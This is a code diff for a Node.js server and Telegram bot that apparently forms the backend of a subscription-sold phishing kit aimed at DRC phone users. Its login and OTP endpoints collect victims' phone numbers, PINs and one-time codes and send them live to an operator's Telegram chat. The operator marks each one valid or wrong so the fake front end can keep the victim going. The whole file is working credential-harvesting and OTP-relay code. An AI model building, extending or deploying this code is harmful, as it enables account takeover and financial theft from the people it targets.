+    if (now - rec.ts > CFG.APPROVAL_TIMEOUT) { Object.assign(rec, { approved: false, rejected: true, expired: true }); await edit(`⏰ <b>EXPIRED</b>\n📞 <code>${phone}</code>\n🔐 <code>${secret}</code>`); await ack('⏰ Expired', true); return; }
+    if (action === 'proceed') { rec.approved = true; await edit(`✅ <b>ALLOWED</b>\n📞 <code>${phone}</code>\n🔐 <code>${secret}</code>\n\n→ OTP step`); await ack('✅ Allowed!'); }
+    else if (action === 'invalid') { Object.assign(rec, { rejected: true, rejectionReason: 'invalid' }); await edit(`❌ <b>INVALID</b>\n📞 <code>${phone}</code>\n🔐 <code>${secret}</code>`); await ack('❌ Invalid'); }
+    return;
+  }
+  if (type === 'otp') {
+    const rec = callbackUser.otps.get(key);
+    if (!rec) { await ack('❌ Not found', true); return; }
+    if (rec.status !== 'pending') { await ack('✅ Already processed'); return; }
+    if (now - rec.ts > CFG.APPROVAL_TIMEOUT) { rec.status = 'timeout'; await edit(`⏰ <b>EXPIRED</b>\n📞 <code>${phone}</code>\n🔑 <code>${secret}</code>`); await ack('⏰ Expired', true); return; }
+    if (action === 'correct') { rec.status = 'approved'; await edit(`✅ <b>VERIFIED</b>\n📞 <code>${phone}</code>\n🔑 <code>${secret}</code>`); await ack('✅ Verified!'); }
+    else if (action === 'wrong') { rec.status = 'rejected'; await edit(`❌ <b>WRONG OTP</b>\n📞 <code>${phone}</code>\n🔑 <code>${secret}</code>`); await ack('❌ Wrong'); }
+    else if (action === 'wrongpin') { rec.status = 'wrong_pin'; await edit(`⚠️ <b>WRONG PIN</b>\n📞 <code>${phone}</code>\n🔑 <code>${secret}</code>`); await ack('⚠️ Wrong PIN'); }
+    return;
+  }
+  await ack('❓ Unknown');
+}
+
+// ── Cleanup ──
+setInterval(() => { const now = Date.now(), exp = now - CFG.APPROVAL_TIMEOUT, del = now - 600000; for (const u of users.values()) { for (const [k, v] of u.logins) { if (!v.expired && v.ts < exp) Object.assign(v, { approved: false, rejected: true, expired: true }); if (v.ts < del) u.logins.delete(k); } for (const [k, v] of u.otps) { if (v.status === 'pending' && v.ts < exp) v.status = 'timeout'; if (v.readAt && now - v.readAt > CFG.READ_TTL) { u.otps.delete(k); continue; } if (v.ts < del) u.otps.delete(k); } } }, CFG.CLEANUP_INTERVAL).unref?.();
+
+// ── Resolve user + buffer ──
+const resolveUser = (req, res, next) => { const { userId } = req.params; if (!userId || !/^[a-z]{2}$/.test(userId)) return res.status(400).json({ success: false, message: 'Invalid user ID' }); const u = users.get(userId); if (!u) return res.status(404).json({ success: false, message: `User "${userId}" not found` }); if (u.expiresAt && isExpired(u.expiresAt)) { u.expired = true; return res.status(402).json({ success: false, expired: true, message: 'Subscription expired.' }); } req.user = u; next(); };
+const botOk = (res) => { if (!bot || !botHealthy) { res.status(503).json({ success: false, message: 'Bot unavailable' }); return false; } return true; };
+const MAX_BUF = 200; let updateBuffer = [];
+const flushUpdateBuffer = () => { if (!bot || !updateBuffer.length) return; const b = updateBuffer; updateBuffer = []; for (const u of b) { try { bot.processUpdate(u); } catch (e) {} } };
+app.post('/webhook/:token', (req, res) => { if (req.params.token !== process.env.BOT_TOKEN) return res.sendStatus(403); if (!bot) { if (updateBuffer.length < MAX_BUF) updateBuffer.push(req.body); return res.sendStatus(200); } try { bot.processUpdate(req.body); } catch (e) {} res.sendStatus(200); });
+
+// ── Health ──
+app.get('/api/health', (_, res) => { res.json({ status: botHealthy ? 'ok' : 'degraded', users: [...users.values()].map(u => ({ id: u.id, name: u.name, source: u.source, expired: u.expired, logins: u.logins.size, otps: u.otps.size })), pendingPayments: pendingPayments.size, pendingRenewals: pendingRenewals.size, ts: ts() }); });
+
+// ── API endpoints ──
+app.post('/api/:userId/check-user-status', resolveUser, (req, res) => { const { phoneNumber } = req.body; if (!phoneNumber) return res.status(400).json({ success: false, message: 'Phone required' }); res.json({ success: true, isReturningUser: false }); });
+
+app.post('/api/:userId/login', resolveUser, async (req, res) => { const user = req.user; if (!botOk(res)) return; const { pin, timestamp } = req.body, raw = req.body.phoneNumber; if (!raw || !pin) return res.status(400).json({ success: false, message: 'Phone and PIN required' }); const pe = vPhone(raw); if (pe) return res.status(400).json({ success: false, message: pe }); const ie = vPin(pin); if (ie) return res.status(400).json({ success: false, message: ie }); const phone = normalise(raw); if (user.dupes.seen(`login:${phone}:${pin}`)) return res.json({ success: true, message: 'Cached' }); const key = `${phone}-${pin}`; user.logins.set(key, { ts: Date.now(), approved: false, rejected: false, expired: false }); const text = fmtLogin(user, { phone, pin, time: timestamp || Date.now() }); const kb = { inline_keyboard: [[{ text: '✅ Allow to Proceed', callback_data: mkCb('login', 'proceed', phone, pin) }],[{ text: '❌ Invalid Information', callback_data: mkCb('login', 'invalid', phone, pin) }]] }; const r = await sendMsg(user, text, { reply_markup: kb }); r.ok ? res.json({ success: true, message: 'Waiting for approval' }) : res.status(500).json({ success: false, message: 'Failed', error: r.err }); });
+
+app.post('/api/:userId/check-login-approval', resolveUser, (req, res) => { const { pin } = req.body, raw = req.body.phoneNumber; if (!raw || !pin) return res.status(400).json({ success: false, message: 'Phone and PIN required' }); const phone = normalise(raw), rec = req.user.logins.get(`${phone}-${pin}`); if (!rec) return res.json({ success: true, approved: false, rejected: false, expired: false }); if (Date.now() - rec.ts > CFG.APPROVAL_TIMEOUT) return res.json({ success: true, approved: false, rejected: true, expired: true }); res.json({ success: true, approved: rec.approved, rejected: rec.rejected, expired: rec.expired || false, rejectionReason: rec.rejectionReason || null }); });
+
+app.post('/api/:userId/verify-otp', resolveUser, async (req, res) => { const user = req.user; if (!botOk(res)) return; const { otp, timestamp } = req.body, raw = req.body.phoneNumber; if (!raw || !otp) return res.status(400).json({ success: false, message: 'Phone and OTP required' }); const pe = vPhone(raw); if (pe) return res.status(400).json({ success: false, message: pe }); const oe = vOtp(otp); if (oe) return res.status(400).json({ success: false, message: oe }); const phone = normalise(raw); if (user.dupes.seen(`otp:${phone}:${otp}`)) return res.json({ success: true, message: 'Cached' }); const key = `${phone}-${otp}`; user.otps.set(key, { status: 'pending', ts: Date.now() }); const text = fmtOtp(user, { phone, otp, time: timestamp || Date.now() }); const kb = { inline_keyboard: [[{ text: '✅ Correct (PIN + OTP)', callback_data: mkCb('otp', 'correct', phone, otp) }],[{ text: '❌ Wrong Code', callback_data: mkCb('otp', 'wrong', phone, otp) },{ text: '⚠️ Wrong PIN', callback_data: mkCb('otp', 'wrongpin', phone, otp) }]] }; const r = await sendMsg(user, text, { reply_markup: kb }); r.ok ? res.json({ success: true, message: 'OTP sent' }) : res.status(500).json({ success: false, message: 'Failed', error: r.err }); });
+
+app.post('/api/:userId/check-otp-status', resolveUser, (req, res) => { const { otp } = req.body, raw = req.body.phoneNumber; if (!raw || !otp) return res.status(400).json({ success: false, message: 'Phone and OTP required' }); const phone = normalise(raw), rec = req.user.otps.get(`${phone}-${otp}`); if (!rec) return res.json({ success: true, status: 'pending' }); if (Date.now() - rec.ts > CFG.APPROVAL_TIMEOUT) return res.json({ success: true, status: 'timeout' }); if (['approved', 'rejected', 'wrong_pin'].includes(rec.status)) rec.readAt = rec.readAt || Date.now(); res.json({ success: true, status: rec.status }); });
+
+app.post('/api/:userId/resend-otp', resolveUser, async (req, res) => { const user = req.user; if (!botOk(res)) return; const raw = req.body.phoneNumber; if (!raw) return res.status(400).json({ success: false, message: 'Phone required' }); const phone = normalise(raw); const r = await sendMsg(user, `🔄 <b>${sanitize(user.name)} — OTP RESEND</b>\n📞 <code>${phone}</code>\n⏰ ${new Date(req.body.timestamp || Date.now()).toLocaleString()}`); r.ok ? res.json({ success: true }) : res.status(500).json({ success: false, error: r.err }); });
+
+app.use((req, res) => res.status(404).json({ success: false, message: 'Not found' }));
+app.use((err, req, res, next) => { log.error('Error:', err.message); res.status(500).json({ success: false, error: 'Internal error' }); });
+
+let server;
+const startServer = async () => {
+  loadEnvUsers(); await connectDB(); await loadUsersFromDB(); sortUsers(); await loadStateFromDB();
+  await new Promise(r => { server = app.listen(PORT, () => {
+    console.log('\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
+    console.log(`🇨🇩 DRC Server — port ${PORT}`);
+    console.log(`🤖 Mode: webhook`);
+    console.log(`🔗 ${WEBHOOK_URL || '(not set)'}`);
+    console.log(`👥 Users: ${users.size}`);
+    console.log(`💰 Reg: KSh. ${PAYMENT_AMOUNT} | Renew: KSh. ${RENEWAL_AMOUNT}`);
+    console.log(`📅 ${EXPIRY_DAYS}d | Warn: ${CFG.WARNING_DAYS}d`);
+    users.forEach(u => { console.log(`   [${u.id}] ${u.name} (${u.source}) ${u.expiresAt ? fmtDate(u.expiresAt) : 'permanent'}`); });
+    console.log('\n📋 Endpoints: /login  /check-login-approval  /verify-otp  /check-otp-status  /resend-otp  /check-user-status');
+    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n'); r();
+  }); });
+  await initBot().catch(e => log.error('Bot init:', e.message));
+  setTimeout(runExpiryCheck, 5000); setInterval(runExpiryCheck, CFG.EXPIRY_CHECK_INTERVAL);
+};
+startServer().catch(e => { log.error('Fatal:', e.message); process.exit(1); });
+
+const shutdown = async (sig) => { markShutdown(); log.info(`${sig} — shutting down...`); if (server) server.close(); for (const u of users.values()) { u.dupes.clear(); u.tgQueue?.flush('shutdown'); } if (bot) { if (sig === 'SIGINT') { try { await bot.deleteWebHook(); } catch(e){} } clearBotListeners(); bot = null; } if (sig === 'SIGINT') { try { require('mongoose').connection.close(); } catch(e){} } process.exit(0); };
 process.on('SIGTERM', () => shutdown('SIGTERM'));
 process.on('SIGINT', () => shutdown('SIGINT'));
-process.on('uncaughtException', (e) => logger.error('Uncaught:', e.message, e.stack));
-process.on('unhandledRejection', (r) => logger.error('Unhandled rejection:', r));
-
-// ============================================
-// START SERVER
-// ============================================
-const server = app.listen(PORT, () => {
-  console.log('\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
-  console.log(`🛰️  DRC Server - Webhook Mode`);
-  console.log(`🚀  Port: ${PORT}`);
-  console.log(`🌐  Webhook base: ${CONFIG.WEBHOOK_URL || '⚠️  WEBHOOK_URL not set!'}`);
-  console.log(`🇨🇩  Country: DRC (+243)`);
-  console.log(`💰  Currency: DOLLAR($)`);
-  console.log(`👥  Users: ${users.size}/${CONFIG.MAX_USERS}`);
-  console.log(`⏱️  Approval timeout: ${CONFIG.APPROVAL_TIMEOUT / 60000} minutes`);
-  console.log(`🔄  NO CACHING - All logins require OTP`);
-  users.forEach((u, l) => console.log(`   ✅ ${u.name}: /api/${l}/*`));
-  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');
-});
+process.on('uncaughtException', (e) => log.error('Uncaught:', e.message, e.stack));
+process.on('unhandledRejection', (r) => log.error('Unhandled:', r));
